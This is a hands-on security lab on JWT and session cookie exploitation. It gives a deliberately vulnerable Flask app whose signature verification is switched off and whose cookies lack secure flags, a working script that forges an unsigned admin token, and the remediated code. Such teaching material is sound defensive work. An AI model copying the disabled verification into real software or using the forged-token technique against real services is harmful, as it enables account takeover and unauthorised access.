# 06 - Hands-on Lab: JWT and Session Exploitation

In this lab, we will run a vulnerable Python application containing a JWT `alg: none` vulnerability and insecure session cookies, exploit it, and then apply secure remediations.

## Part 1: Vulnerable Application (Python/Flask)

Create `app.py`:
```python
from flask import Flask, request, jsonify, make_response
import jwt
import base64
import json

app = Flask(__name__)
SECRET_KEY = "super_secret_key"

@app.route('/login', methods=['POST'])
def login():
    # Insecure authentication, just for demo
    user = request.json.get('username')
    token = jwt.encode({"user": user, "role": "guest"}, SECRET_KEY, algorithm="HS256")
    
    resp = make_response(jsonify({"message": "Logged in"}))
    # INSECURE COOKIE: No HttpOnly, No Secure flag
    resp.set_cookie('session_token', token)
    return resp

@app.route('/admin', methods=['GET'])
def admin():
    token = request.cookies.get('session_token')
    if not token:
        return "Unauthorized", 401
    
    try:
        # VULNERABILITY: algorithms parameter is NOT specified.
        # This library might accept 'none' algorithm!
        # Note: Modern PyJWT requires algorithms=[], this is simulating older/vulnerable configs
        decoded = jwt.decode(token, SECRET_KEY, options={"verify_signature": False})
        
        if decoded.get('role') == 'admin':
            return "Welcome, Admin. Flag: FLAG{JWT_Bypass_Success}"
        return "Access Denied: Not Admin"
    except Exception as e:
        return str(e), 400

if __name__ == '__main__':
    app.run(port=5000)
```

## Part 2: Exploit Script

Create `exploit.py`:
```python
import base64

# Construct Header for alg: none
header = '{"alg": "none", "typ": "JWT"}'
header_b64 = base64.urlsafe_b64encode(header.encode()).decode().rstrip('=')

# Construct Payload with admin role
payload = '{"user": "attacker", "role": "admin"}'
payload_b64 = base64.urlsafe_b64encode(payload.encode()).decode().rstrip('=')

# Combine without signature, leave trailing dot (optional depending on lib, but standard for none alg)
forged_token = f"{header_b64}.{payload_b64}."

print(f"Forged Token: {forged_token}")
print(f"To exploit, set your 'session_token' cookie to this value and visit /admin")
```

## Part 3: Remediation (Secure Code)

To fix the application, we must enforce the signature algorithm and secure the cookies.

```python
@app.route('/login', methods=['POST'])
def secure_login():
    user = request.json.get('username')
    token = jwt.encode({"user": user, "role": "guest"}, SECRET_KEY, algorithm="HS256")
    
    resp = make_response(jsonify({"message": "Logged in securely"}))
    # SECURE COOKIE: HttpOnly, Secure, SameSite
    resp.set_cookie('session_token', token, httponly=True, secure=True, samesite='Strict')
    return resp

@app.route('/admin', methods=['GET'])
def secure_admin():
    token = request.cookies.get('session_token')
    if not token:
        return "Unauthorized", 401
    
    try:
        # SECURE VERIFICATION: Explicitly define allowed algorithms and verify signature
        decoded = jwt.decode(token, SECRET_KEY, algorithms=["HS256"])
        
        if decoded.get('role') == 'admin':
            return "Welcome, Admin."
        return "Access Denied"
    except jwt.InvalidTokenError:
        return "Invalid Token", 401
```
